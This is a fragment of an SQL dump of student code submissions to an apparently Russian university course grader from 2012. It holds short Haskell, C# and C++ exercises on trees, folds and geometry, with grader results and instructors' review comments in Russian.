(1356, 39, '6774563', '2012-10-03 16:17:09', 1, 'maxInt = 2000000000;\r\n\r\ndata Tree = Node Integer Tree Tree | Empty\r\n\r\nminHeight Empty = 0\r\nminHeight t = minHeightImpl maxInt 0 t \r\n\r\nminHeightImpl curMin curDepth Empty = maxInt\r\nminHeightImpl curMin curDepth (Node key Empty Empty) = 0\r\nminHeightImpl curMin curDepth (Node key left right)\r\n	| curDepth >= curMin = maxInt\r\n	| True = do\r\n		let leftHeight = minHeightImpl curMin (curDepth + 1) left\r\n		1 + min leftHeight (minHeightImpl (min curMin (leftHeight + 1)) (curDepth + 1) right)\r\n', '<br/>Тесты успешно пройдены!'),
(1357, 47, '6774563', '2012-10-03 16:21:35', 1, 'powerset xs = powersetImpl [] (reverse xs)\r\n\r\npowersetImpl prefix [] = [prefix]\r\npowersetImpl prefix (x:xs) = (powersetImpl (x:prefix) xs) ++ (powersetImpl prefix xs)\r\n', '<br/>Тесты успешно пройдены!'),
(1358, 45, '6774563', '2012-10-03 16:38:49', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\n\r\nnamespace task_8_1\r\n{\r\n    class Program\r\n    {\r\n        private static bool HasEvenInEverySublist(IEnumerable<IEnumerable<int>> list)\r\n        {\r\n            return list.All(sublist => sublist.Any(x => x % 2 == 0));\r\n        }\r\n\r\n        public static void Main(string[] args)\r\n        {\r\n            var a = new[] { new[] {1, -3, 2}, new[] { 1, 3, -4 } };\r\n            Console.WriteLine(HasEvenInEverySublist(a));\r\n            Console.ReadKey();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1359, 38, '528420', '2012-10-03 16:41:22', 1, 'data Tree = Empty | Node Integer Tree Tree\r\nheight :: Tree -> Integer\r\nheight Empty = 0\r\nheight (Node _ Empty Empty) = 0\r\nheight (Node _ l r) = 1 + (max (height l) (height r))', '<br/>Тесты успешно пройдены!'),
(1360, 46, '6774563', '2012-10-03 16:59:16', 1, '#include "stdio.h"\r\n#include "conio.h"\r\n#include <vector>\r\n#include <algorithm>\r\n\r\nusing namespace std;\r\n\r\nint main() {\r\n	vector<int> test;\r\n	test.push_back(1);\r\n	test.push_back(2);\r\n	test.push_back(3);\r\n\r\n	vector<int>::iterator it = find_if(test.begin(), test.end(), [] (int x) -> bool { return x % 2 == 0; } );\r\n           --- Просто как замечание, тут можно auto it = ... - чтобы не выписывать длинный тип\r\n\r\n	bool hasEven = it != test.end();\r\n	printf(hasEven ? "Has" : "Has no");\r\n	getch();\r\n\r\n	return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(1361, 38, '82873297', '2012-10-03 17:01:29', 1, 'data Tree = Empty | Node Integer Tree Tree \r\n\r\n\r\n\r\nheight Empty = 0\r\n\r\nheight (Node _ Empty Empty) = 0\r\n\r\nheight (Node _ l r) = 1 + max (height l) (height r)\r\n', '<br/>Тесты успешно пройдены!'),
(1362, 38, '3742311', '2012-10-03 17:03:56', 1, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\nheight Empty = 0\r\nheight (Node _ Empty Empty) = 0\r\nheight (Node _ l r) = 1 + (max (height l) (height r))', '<br/>Тесты успешно пройдены!'),
(1363, 49, '6774563', '2012-10-03 17:12:31', 1, 'using System;\r\n\r\nnamespace task_10_1\r\n{\r\n    internal sealed class Tree<T>\r\n    {\r\n        public T Key { get; private set; }\r\n        public Tree<T> Left { get; private set; }\r\n        public Tree<T> Right { get; private set; }\r\n\r\n        public Tree(T key, Tree<T> left, Tree<T> right)\r\n        {\r\n            Key = key;\r\n            Left = left;\r\n            Right = right;\r\n        }\r\n\r\n        public bool Any(Func<T, bool> predicate)\r\n        {\r\n            return predicate(Key) \r\n                || (Left == null ? false : Left.Any(predicate))  // && for All()\r\n                || (Right == null ? false : Right.Any(predicate));\r\n        }\r\n    }\r\n\r\n    internal sealed class Program\r\n    {\r\n        public static void Main()\r\n        {\r\n            var test = new Tree<int>(1, new Tree<int>(5, null, null), new Tree<int>(1, new Tree<int>(3, null, null), null));\r\n            Console.WriteLine(test.Any(x => x % 2 == 0));\r\n            Console.ReadLine();\r\n        }\r\n    }\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(1364, 39, '3742311', '2012-10-03 17:29:06', 0, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\ntoChilds [] = []\r\ntoChilds (Node _ l r):t = l:r:(toChilds t)\r\n\r\nminHeighttmp l h = if (any (x -> x == (Node _ Empty Empty)) l) then h else (minHeight (toChilds l) (h + 1))\r\n\r\nminHeight Empty = 0\r\nminHeight t = minHeighttmp [t] 0', 'Не удалось вычислить выражение "minHeight (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(1365, 39, '3742311', '2012-10-03 17:32:50', 0, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\ntoChilds [] = []\r\ntoChilds (Node _ l r):t = l:r:(toChilds t)\r\n\r\nhasChilds Empty = False\r\nhasChilds (Node _ Empty Empty) = False\r\nhasChilds t = True\r\n\r\nminHeighttmp l h = if (any (x -> hasChilds x) l) then h else (minHeighttmp (toChilds l) (h + 1))\r\n\r\nminHeight Empty = 0\r\nminHeight t = minHeighttmp [t] 0', 'Не удалось вычислить выражение "minHeight (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(1366, 50, '6774563', '2012-10-03 17:34:01', 1, '#include "stdio.h"\r\n#include "conio.h"\r\n\r\nclass Tree {\r\npublic:\r\n	Tree(int const key, Tree *left, Tree *right)\r\n		: key(key), left(left), right(right) {\r\n             --- Я бы тут задал умолчания NULL для указателей, создание дерева выглядело бы короче\r\n	}\r\n\r\n	// Не буду разносить по .h и .cpp т.к. слать одним файлом надо\r\n	int getKey() const { return key; }\r\n	Tree *getLeft() const { return left; }\r\n	Tree *getRight() const { return right; }\r\n\r\n	template<typename F>\r\n	bool any(F &predicate) const {\r\n		return predicate(key)\r\n			|| (left ? left->any(predicate) : false)\r\n			|| (right ? right->any(predicate) : false);\r\n            --- или можно \r\n            ---   return predicate(key) || (left && left->any(predicate)) || (right && right->any(predicate));\r\n	}\r\n\r\nprivate:\r\n	int key;\r\n	Tree *left;\r\n	Tree *right;\r\n\r\n};\r\n\r\nint main() {\r\n	Tree *test = new Tree(1, new Tree(52, NULL, NULL), new Tree(1, new Tree(3, NULL, NULL), NULL));\r\n           --- просто как замечание, теперь более современно не NULL а nullptr\r\n	bool hasEven = test->any([] (int x) -> bool { return x % 2 == 0; });\r\n\r\n	printf(hasEven ? "Has" : "Has no");\r\n	getch();\r\n\r\n	return 0;\r\n}', '<br/>Тесты успешно пройдены!'),
(1367, 39, '3742311', '2012-10-03 17:36:01', 0, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\ntoChilds [] = []\r\ntoChilds ((Node _ l r):t) = (l:r:(toChilds t))\r\n\r\nhasChilds Empty = False\r\nhasChilds (Node _ Empty Empty) = False\r\nhasChilds t = True\r\n\r\nminHeighttmp l h = if (any (x -> hasChilds x) l) then h else (minHeighttmp (toChilds l) (h + 1))\r\n\r\nminHeight Empty = 0\r\nminHeight t = minHeighttmp [t] 0', 'Не удалось вычислить выражение "minHeight (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(1368, 39, '3742311', '2012-10-03 17:44:01', 0, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\ntoChilds [] = []\r\ntoChilds ((Node _ l r):t) = l:r:(toChilds t)\r\n\r\nhasChilds Empty = False\r\nhasChilds (Node _ Empty Empty) = False\r\nhasChilds t = True\r\n\r\nminHeighttmp l h = if (any (x -> hasChilds x) l) then h else (minHeighttmp (toChilds l) (h + 1))\r\n\r\nminHeight Empty = 0\r\nminHeight t = minHeighttmp t:[] 0', 'Не удалось вычислить выражение "minHeight (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(1369, 39, '3742311', '2012-10-03 17:45:14', 0, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\ntoChilds [] = []\r\ntoChilds ((Node _ l r):t) = l:r:(toChilds t)\r\n\r\nhasChilds Empty = False\r\nhasChilds (Node _ Empty Empty) = False\r\nhasChilds t = True\r\n\r\nminHeighttmp l h = if (any (x -> (hasChilds x)) l) then h else (minHeighttmp (toChilds l) (h + 1))\r\n\r\nminHeight Empty = 0\r\nminHeight t = minHeighttmp (t:[]) 0', 'Не удалось вычислить выражение "minHeight (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(1370, 38, '383483', '2012-10-03 17:54:43', 1, 'data Tree = Empty | Node Integer Tree Tree\r\nheight t = height2 t (-1)\r\nheight2 Empty res = res\r\nheight2 (Node _ l r) res = countH (height2 l (res+1)) (height2 r (res+1)) \r\ncountH a b \r\n     | a>b = a\r\n     | otherwise = b\r\n   --- Вместо countH можно использовать стандартную функцию max\r\n', '<br/>Тесты успешно пройдены!'),
(1371, 47, '17107004', '2012-10-03 18:20:03', 1, '\r\npowerset = foldr ( x l -> (map ((:) x) l) ++ l) [[]]\r\n  --- или вместо (:)x можно написать (x:) (т.н. section)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1372, 43, '397095', '2012-10-03 18:37:45', 1, 'euclid a b = eu a b\r\n\r\neu 0 _ = (0, 1)\r\neu a b = \r\n	let \r\n		(x1, y1) = eu (mod b a) a\r\n	in\r\n		(y1 - (div b a) * x1, x1)', '<br/>Тесты успешно пройдены!'),
(1373, 42, 'sromanov', '2012-10-03 18:42:40', 1, 'myfoldl _ acc [] = acc\r\nmyfoldl f acc (x:xs) = myfoldl f (f acc x) xs\r\n', '<br/>Тесты успешно пройдены!'),
(1374, 42, 'artyushov', '2012-10-03 18:58:01', 1, 'myfoldl f n [] = n\r\nmyfoldl f n (x:xs) = myfoldl f (f n x) xs', '<br/>Тесты успешно пройдены!'),
(1375, 35, 'artyushov', '2012-10-03 19:11:17', 1, 'dist a b = ((fst b) - (fst a))^2 + ((snd b) - (snd a))^2\r\nisosc a b c = (dist a b == dist b c) || (dist a b == dist a c) || (dist b c == dist a c)', '<br/>Тесты успешно пройдены!'),
(1376, 42, 'Маргарита Нурмухаметова', '2012-10-03 19:19:26', 1, 'myfoldl f acc [] = acc \r\n\r\nmyfoldl f acc (x:xs) = f x (foldl f acc xs) \r\n    --- Это вы фактически написал foldr. те вы вычисляете справа налево. Поэтому и ответ неправильный.\r\n', 'Выражение имеет неправильное значение: myfoldl (^) 2 [3]'),
(1377, 36, 'Маргарита Нурмухаметова', '2012-10-03 19:23:39', 1, 'cubeTable num = [(x,x*x*x)|x <- [1..num]]\r\n', '<br/>Тесты успешно пройдены!'),
(1378, 35, 'Маргарита Нурмухаметова', '2012-10-03 19:24:19', 1, 'isosc (x1,y1) (x2,y2) (x3,y3) = if sqrt((x2-x1)^2+(y2-y1)^2) == sqrt((x3-x1)^2+(y3-y1)^2) || sqrt((x2-x1)^2+(y2-y1)^2) == sqrt((x3-x2)^2+(y3-y2)^2) || sqrt((x3-x1)^2+(y3-y1)^2) == sqrt((x3-x2)^2+(y3-y2)^2)\r\n\r\n                                   then True\r\n\r\n                                   else False \r\n', '<br/>Тесты успешно пройдены!'),
(1379, 39, '3742311', '2012-10-03 19:27:01', 0, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\ntoChilds [] = []\r\ntoChilds ((Node _ l r):t) = l:r:(toChilds t)\r\n\r\nhasChilds Empty = False\r\nhasChilds (Node _ Empty Empty) = False\r\nhasChilds t = True\r\n\r\nminHeighttmp l h = if (any (x -> not (hasChilds x)) l) then h else (minHeighttmp (toChilds l) (h + 1))\r\n\r\nminHeight Empty = 0\r\nminHeight t = minHeighttmp (t:[]) 0', 'Выражение имеет неправильное значение: minHeight (Node 1 (Node 2 (Node 3 Empty Empty) Empty) Empty)'),
(1380, 35, '442421', '2012-10-03 19:30:02', 0, 'isosc (x1,y1) (x2,y2) (x3,y3) = checkDifferent [dist2(x1,y1)(x2,y2),dist2(x1,y1)(x3,y3),dist2(x2,y2)(x3,y3)]\r\n\r\ndist2 (x1,y1) (x2,y2) = (x2-x1)^2+(y2-y1)^2\r\n\r\ncheckDifferent [] = True\r\ncheckDifferent (x:xs) = checkDifferent xs && notexists x xs\r\n\r\nnotexists x [] = True\r\nnotexists a (x:xs) = if a==x\r\n			then False\r\n			else notexists a xs\r\n\r\n', 'Выражение имеет неправильное значение: isosc (0, 2) (2, 0) (2,2)'),
(1381, 36, 'artyushov', '2012-10-03 19:32:26', 1, 'cubeTable n = zip [1..n] (map (^3) [1..n])', '<br/>Тесты успешно пройдены!'),
(1382, 35, '442421', '2012-10-03 19:33:28', 1, 'isosc (x1,y1) (x2,y2) (x3,y3) = not (checkDifferent [dist2(x1,y1)(x2,y2),dist2(x1,y1)(x3,y3),dist2(x2,y2)(x3,y3)])\r\n\r\ndist2 (x1,y1) (x2,y2) = (x2-x1)^2+(y2-y1)^2\r\n\r\ncheckDifferent [] = True\r\ncheckDifferent (x:xs) = checkDifferent xs && notexists x xs\r\n\r\nnotexists x [] = True\r\nnotexists a (x:xs) = if a==x\r\n			then False\r\n			else notexists a xs\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1383, 39, '3742311', '2012-10-03 19:34:22', 1, 'data Tree = Node Integer Tree Tree | Empty\r\n\r\ntoChilds [] = []\r\ntoChilds ((Node _ Empty r):t) = r:(toChilds t)\r\ntoChilds ((Node _ l Empty):t) = l:(toChilds t)\r\ntoChilds ((Node _ l r):t) = l:r:(toChilds t)\r\n\r\nhasChilds Empty = False\r\nhasChilds (Node _ Empty Empty) = False\r\nhasChilds t = True\r\n\r\nminHeighttmp l h = if (any (x -> not (hasChilds x)) l) then h else (minHeighttmp (toChilds l) (h + 1))\r\n\r\nminHeight Empty = 0\r\nminHeight t = minHeighttmp (t:[]) 0', '<br/>Тесты успешно пройдены!'),
(1384, 35, '9539826', '2012-10-03 19:47:32', 1, 'isosc (x1, y1) (x2, y2) (x3, y3) = (((x1-x2)^2+(y1-y2)^2)==((x1-x3)^2+(y1-y3)^2))||(((x1-x2)^2+(y1-y2)^2)==((x2-x3)^2+(y2-y3)^2))||(((x1-x3)^2+(y1-y3)^2)==((x2-x3)^2+(y2-y3)^2))', '<br/>Тесты успешно пройдены!'),
(1385, 37, '9539826', '2012-10-03 19:58:56', 0, '', 'Не удалось вычислить выражение "minsum [1,8,3,2,7] ", проверьте правильность синтаксиса'),
(1386, 37, '9539826', '2012-10-03 19:59:24', 2, 'minsum [x] = x\r\nminsum [x, y] = x+y\r\nminsum [x, y,z] = if x+y<y+z then x+y else y+z\r\nminsum x = minimum (listsum x)\r\n\r\nlistsum [x,y] = [x+y]\r\nlistsum (x:(y:z)) = (x+y):(listsum (y:z))\r\n   --- Нет, это у вас не по условию. В этой задаче нельзя было использовать свои рекурсивные функции.\r\n   --- Те надо как-то придумать, как выразить listsum через стандартные функции.\r\n', '<br/>Тесты успешно пройдены!'),
(1387, 47, '3742311', '2012-10-03 20:02:37', 0, 'powerset l = foldl (\r x -> foldl (	 h -> h:t) r (map (z -> x:z) r)) ([]:[]) l', 'Выражение имеет неправильное значение: elem [1,3] (powerset [1,2,3])'),
(1388, 47, '3742311', '2012-10-03 20:05:06', 1, 'powerset l = foldr (x r -> foldl (	 h -> h:t) r (map (z -> x:z) r)) ([]:[]) l', '<br/>Тесты успешно пройдены!'),
(1389, 36, '442421', '2012-10-03 20:11:06', 1, 'cubeTable n = zip [1..n] (map (^3) [1 .. n])\r\n', '<br/>Тесты успешно пройдены!'),
(1390, 38, 'artyushov', '2012-10-03 20:19:32', 1, 'data Tree = Empty | Node Integer Tree Tree\r\nheight1 Empty = 0\r\nheight1 (Node x l r) = 1 + (max (height1 l) (height1 r))\r\nheight x = (height1 x) - 1\r\n', '<br/>Тесты успешно пройдены!'),
(1391, 48, '3742311', '2012-10-03 20:24:01', 2, 'myreverse l = foldr (x r -> foldr (h t -> h:t) (x:[]) r) [] l\r\n   --- Нет, это не по условию.. В условии "Функция должна работать за линейное время. \r\n   --- Технически это означает, что нельзя использовать операцию ++ [x] или \r\n   --- каким-то другим способом приписывать очередной элемент к концу списка на каждом шаге работы foldr."\r\n   --- А вы как раз это и делаете, приписываете элемент в конец на каждом шаге,и в результате у вас \r\n   --- функция имеет квадратичную сложность. ', '<br/>Тесты успешно пройдены!'),
(1392, 42, '9539826', '2012-10-03 20:34:11', 1, 'myfoldl x y [] = y\r\nmyfoldl f y (x:xs) = myfoldl f (f y x) xs', '<br/>Тесты успешно пройдены!'),
(1393, 36, 'sromanov', '2012-10-03 20:38:25', 1, 'cubeTable n = map (x->(x,x^3)) [1..n]', '<br/>Тесты успешно пройдены!'),
(1394, 41, 'artyushov', '2012-10-03 20:45:03', 1, 'countOdd1 l = length (filter (odd) l)\r\nf x n = if (even x) then n else n + 1\r\ncountOdd l = foldr f 0 l', '<br/>Тесты успешно пройдены!'),
(1395, 41, '9539826', '2012-10-03 20:57:11', 2, 'sum2 x y = if y mod 2 == 1 then (x+1) else x\r\n   --- Тут просто надо написать не y mod 2 а или mod y 2 (в префиксной форме) или y `mod` 2\r\n   --- А так вроде все правильно. Но только вам надо придумать еще один способ (написать countOdd1) \r\n\r\ncountOdd xs = foldr (sum2) 0 xs \r\n\r\nНе понимаю почему не работатет', 'Не удалось вычислить выражение "countOdd [2, 3, 4, 8, 5, 33, 9]", проверьте правильность синтаксиса'),
(1396, 37, '442421', '2012-10-03 21:00:49', 2, 'minsum x = tuplesum (minimum (zip (tail x) x))\r\ntuplesum (x,y) = x+y\r\n   --- Нет, это на самом деле неправильно.. \r\n   --- Например minsum [2,9,1,3] у вас дает неправильный ответ (такого теста не было, но сейчас я его добавил)\r\n   --- Дело в том, что _пары_ сравниваются вовсе не по сумме чисел.\r\n   --- Я в принципе и это решение засчитаю, хоть оно и неправильное, но если вы исправите, это было бы замечательно.', '<br/>Тесты успешно пройдены!'),
(1397, 35, '5772638', '2012-10-03 21:08:27', 1, 'isosc x y z = (len x y == len y z) || (len x y == len x z) || (len y z == len x z)\r\nlen x y = ((fst y - fst x)^2 + (snd y - snd x)^2)**1/2', '<br/>Тесты успешно пройдены!'),
(1398, 35, '214982', '2012-10-03 21:24:31', 2, 'dist (x, y) (z, t) = abs(sqrt(x*x + y*y) - sqrt(z*z + t*t)) \r\n  --- Вообще-то у вас формула расстояния абсолютно неправильная!! Например isosc (0,5) (3,4) (5,0)\r\n  --- у вас возвращает True (такого теста не было, но сечйас я его добавил). \r\n  --- Я вам засчитаю, хоть это и неправильно, но если бы вы написали\r\n  --- правилньую формулу, это было бы замечательно\r\n\r\nisosc (x, y) (z, t) (p, r) = if (dist (x, y) (p,r) == dist(x, y) (z, t)) then True else if (dist (p, r) (x, y) == dist(p, r) (z, t)) then True else (dist (z, t) (x, y) == dist (z, t) (p, r))', '<br/>Тесты успешно пройдены!'),
(1399, 38, '51559263', '2012-10-03 21:30:32', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\n\r\n\r\nheight Empty = -1\r\n\r\nheight ( Node _ l r ) = max ( height l ) ( height r ) + 1\r\n', '<br/>Тесты успешно пройдены!'),
(1400, 40, 'artyushov', '2012-10-03 21:38:34', 1, 'oneList n = oneList1 n n\r\noneList1 0 n = []\r\noneList1 i n = 1 : oneList1 (i-1) n\r\n\r\nedgeList n = 1 : (edgeList1 (n-1) n)\r\nedgeList1 1 n = [1]\r\nedgeList1 i n = 0 : (edgeList1 (i-1) n)\r\n\r\nframe n = (oneList n) : frame1 (n-1) n\r\nframe1 1 n = [oneList n]\r\nframe1 i n = (edgeList n) :frame1 (i-1) n\r\n', '<br/>Тесты успешно пройдены!'),
(1401, 42, '5772638', '2012-10-03 21:43:28', 1, 'myfoldl f z [] = z\r\nmyfoldl f z (x:xs) = myfoldl f (f z x) xs', '<br/>Тесты успешно пройдены!'),
(1402, 37, 'artyushov', '2012-10-03 21:51:04', 1, 'shift (x:xs) = xs ++ [x]\r\nminsum l = minimum (zipWith (+) l (shift l))', '<br/>Тесты успешно пройдены!'),
(1403, 38, 'sromanov', '2012-10-03 21:58:41', 0, 'height Empty = 0\r\nheight (Node _ Empty Empty) = 0\r\nheight (Node _ l r) = 1 + max (height r) (height l)', 'Не удалось вычислить выражение "height (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(1404, 38, 'sromanov', '2012-10-03 22:00:07', 0, 'height Empty = 0\r\nheight (Node _ Empty Empty) = 0\r\nheight (Node _ l r) = 1 + max (height r) (height l)\r\n', 'Не удалось вычислить выражение "height (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(1405, 38, 'sromanov', '2012-10-03 22:00:30', 0, 'height Empty = 0\r\nheight (Node _ Empty Empty) = 0\r\nheight (Node _ l r) = 1 + max (height r) (height l)\r\n', 'Не удалось вычислить выражение "height (Node 1 Empty Empty)", проверьте правильность синтаксиса'),
(1406, 38, 'sromanov', '2012-10-03 22:01:29', 1, 'data Tree = Empty | Node Integer Tree Tree deriving Show\r\n\r\nheight Empty = 0\r\nheight (Node _ Empty Empty) = 0\r\nheight (Node _ l r) = 1 + max (height r) (height l)', '<br/>Тесты успешно пройдены!'),
(1407, 36, '5772638', '2012-10-03 22:04:41', 1, 'cubeTable n = [(x,x^3)|x<-[1..n]]', '<br/>Тесты успешно пройдены!'),
(1408, 35, 'sromanov', '2012-10-03 22:16:34', 0, 'data Point = Point Float Float\r\n\r\ndist (Point x1 y1) (Point x2 y2) = sqrt((x1-x2)^2 + (y1-y2)^2)\r\n\r\nisosс (x1,y1) (x2,y2) (x3,y3) = a == b || a == c || b == c\r\n    where a = dist (Point x1 y1) (Point x2 y2)\r\n          b = dist (Point x1 y1) (Point x3 y3)\r\n          c = dist (Point x2 y2) (Point x3 y3)', 'Не удалось вычислить выражение "isosc (0, 2) (2, 0) (2,2)", проверьте правильность синтаксиса'),
(1409, 35, 'sromanov', '2012-10-03 22:21:14', 1, 'data Point = Point Float Float\r\n\r\ndist (Point x1 y1) (Point x2 y2) = sqrt((x1-x2)^2 + (y1-y2)^2)\r\n\r\nisosc (x1,y1) (x2,y2) (x3,y3) = a == b || a == c || b == c\r\n    where a = dist (Point x1 y1) (Point x2 y2)\r\n          b = dist (Point x1 y1) (Point x3 y3)\r\n          c = dist (Point x2 y2) (Point x3 y3)\r\n       --- А зачем вообще Point?? Почему бы не написать dist для пар? ', '<br/>Тесты успешно пройдены!'),
(1410, 35, '83813', '2012-10-03 23:22:46', 1, 'sqr x = x * x\r\n\r\n\r\n\r\n--dist :: (Num a) => (a, a) -> (a, a) -> Double\r\n\r\ndist (x1, y1) (x2, y2) = sqrt (sqr (x1 - x2) + (sqr (y1 - y2)))\r\n   --- Я бы тут корень не извлекал, получиться и быстрее и точнее\r\n\r\n\r\n--isosc :: (Num a) => (a, a) -> (a, a) -> (a, a) -> Bool\r\n\r\nisosc p1@(x1, y1) p2@(x2, y2) p3@(x3, y3) =\r\n     --- А зачем @ ? Просто isosc p1 p2 p3, вот и все..\r\n  dist p1 p2 == (dist p1 p3) ||\r\n\r\n  dist p1 p2 == (dist p2 p3) ||\r\n\r\n  dist p1 p3 == (dist p2 p3)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1411, 36, '83813', '2012-10-03 23:30:46', 0, 'cubeTable n = [(a, a*a*a) | a <- [1..n]]\n\n\n', '<br/>Тесты успешно пройдены!'),
(1412, 36, '83813', '2012-10-03 23:40:10', 1, 'cubeTable n = map (x -> (x, x*x*x)) [1..n]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1413, 48, 'erwert', '2012-10-03 23:45:25', 1, 'f x = x\r\nmyreverse l = foldr (f a b -> a (f:b)) f l []\r\n', '<br/>Тесты успешно пройдены!'),
(1414, 37, '83813', '2012-10-03 23:50:56', 1, 'minsum xs = fst (foldl ((accres, acclast) x -> (min accres (acclast + x), x)) (1000000, 1000000) xs)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1415, 38, '83813', '2012-10-03 23:57:01', 0, 'data Node = Node Integer Node Node | Empty deriving Show\n\n\n\nheight (Node _ Empty Empty) = 0\n\nheight (Node _ a Empty) = 1 + height a\n\nheight (Node _ Empty a) = 1 + height a\n\nheight (Node _ a b) = 1 + max (height a) (height b)\n\n\n', '<br/>Тесты успешно пройдены!'),
(1416, 38, '83813', '2012-10-03 23:58:13', 1, 'data Node = Node Integer Node Node | Empty deriving Show\r\n\r\n\r\n\r\nheight Empty = -1\r\n\r\nheight (Node _ a b) = 1 + max (height a) (height b)\r\n\r\n\r\n\r\n--height (Node _ Empty Empty) = 0\r\n\r\n--height (Node _ a Empty) = 1 + height a\r\n\r\n--height (Node _ Empty a) = 1 + height a\r\n\r\n--height (Node _ a b) = 1 + max (height a) (height b)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1417, 39, '83813', '2012-10-04 00:02:11', 2, 'data Node = Node Integer Node Node | Empty deriving Show\r\n\r\n\r\n\r\nminHeight Empty = 1000000\r\n\r\nminHeight (Node _ Empty Empty) = 0\r\n\r\nminHeight (Node _ a b) = 1 + min (minHeight a) (minHeight b)\r\n   --- Нет, это не засчитано, к сожалению. Решение конечно правильное, но тут должна быть обязательно\r\n   --- реализована оптимизация, надо чтобы обходились не все листья, так написано в условии..\r\n\r\n\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1418, 40, '83813', '2012-10-04 00:06:54', 1, 'full n = map (x -> 1) [1..n]\r\n\r\nemp n = [1] ++ (map (x -> 0) [2..n-1]) ++ [1]\r\n\r\n\r\n\r\nframe 1 = [[1]]\r\n\r\nframe n = [full n] ++ (map (l -> emp n) [2..n-1]) ++ [full n]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1419, 41, '83813', '2012-10-04 00:12:24', 1, 'countOdd xs = foldr (x acc -> acc + (x `mod` 2)) 0 xs\r\n\r\ncountOdd1 xs = length (filter (odd) xs)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1420, 42, '83813', '2012-10-04 00:17:30', 1, 'myfoldl f init [] = init\r\n\r\nmyfoldl f init (x:xs) = myfoldl f (f init x) xs\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(1421, 42, 'jamesbrain', '2012-10-04 00:34:05', 1, 'myfoldl f x [] = x\r\n\r\nmyfoldl f x (h:t) = myfoldl f (f x h) t\r\n', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(1422, 41, 'jamesbrain', '2012-10-04 00:34:25', 2, 'countOdd l = foldr (elem count -> count + elem `mod` 2) 0 l\r\n\r\ncountOdd1 l = foldl (count elem -> count + elem `mod` 2) 0 l\r\n   --- Нет, формально вы сделали по условию, но мы в условиях подразумеваем некоторую неформальную разумность\r\n   --- и в данном случае подразумевается, что второе решение должно отличаться от первого. Можете считать,\r\n   --- что во втором решении нельзя использовать никакой fold, например.\r\n   --- Попробуйте исправить, пожалуйста, можно до утра пятницы  \r\n', '<br/>Тесты успешно пройдены!'),
(1423, 40, 'jamesbrain', '2012-10-04 00:34:36', 1, 'top 1 = [1]\r\n\r\ntop n = 1:(top (n-1))\r\n\r\ninside n = inside1 n n\r\n\r\ninside1 m n | n==m = 1:(inside1 m (n-1))\r\n\r\ninside1 m 1 = [1]\r\n\r\ninside1 m cur = 0:(inside1 m (cur-1)) \r\n\r\nframe n = frame1 n 1\r\n\r\nframe1 n m | n==m = [top n]\r\n\r\nframe1 n 1 = (top n):(frame1 n 2)\r\n\r\nframe1 n cur = (inside n):(frame1 n (cur+1))\r\n', '<br/>Тесты успешно пройдены!'),
(1424, 38, 'jamesbrain', '2012-10-04 00:34:50', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nheight Empty = 0\r\n\r\nheight (Node _ Empty Empty) = 0\r\n\r\nheight (Node i left right) = (max (height left) (height right)) + 1\r\n', '<br/>Тесты успешно пройдены!'),
(1425, 37, 'jamesbrain', '2012-10-04 00:35:02', 1, 'fs (x, y) = x \r\n  --- Это, на самом деле, стандартная функция fst \r\n\r\nminsum (h1:h2:t) = fs (foldl ((sum, center) y -> if (sum > center + y) then (center+y, y) else (sum, y)) (h1+h2,h2) t)\r\n', '<br/>Тесты успешно пройдены!'),
(1426, 36, 'jamesbrain', '2012-10-04 00:35:13', 1, 'cubeTable num = map (x->(x,x^3)) [1..num]\r\n', '<br/>Тесты успешно пройдены!'),
(1427, 35, 'jamesbrain', '2012-10-04 00:35:23', 0, 'len x1 y1 x2 y2 = sqrt ((x1-x2)^2 + (y1-y2)^2)\r\n\niosc (x1,y1) (x2,y2) (x3,y3) = len x1 y1 x2 y2 == len x2 y2 x3 y3 || len x1 y1 x3 y3 == len x2 y2 x3 y3 || len x2 y2 x3 y3 == len x1 y1 x2 y2\n', 'Не удалось вычислить выражение "isosc (0, 2) (2, 0) (2,2)", проверьте правильность синтаксиса'),
(1428, 35, 'jamesbrain', '2012-10-04 00:35:52', 0, 'len x1 y1 x2 y2 = sqrt ((x1-x2)^2 + (y1-y2)^2)\r\n\nisosc (x1,y1) (x2,y2) (x3,y3) = len x1 y1 x2 y2 == len x2 y2 x3 y3 || len x1 y1 x3 y3 == len x2 y2 x3 y3 || len x2 y2 x3 y3 == len x1 y1 x2 y2\n', 'Выражение имеет неправильное значение: isosc (2,2) (0, 2) (2, 0)'),
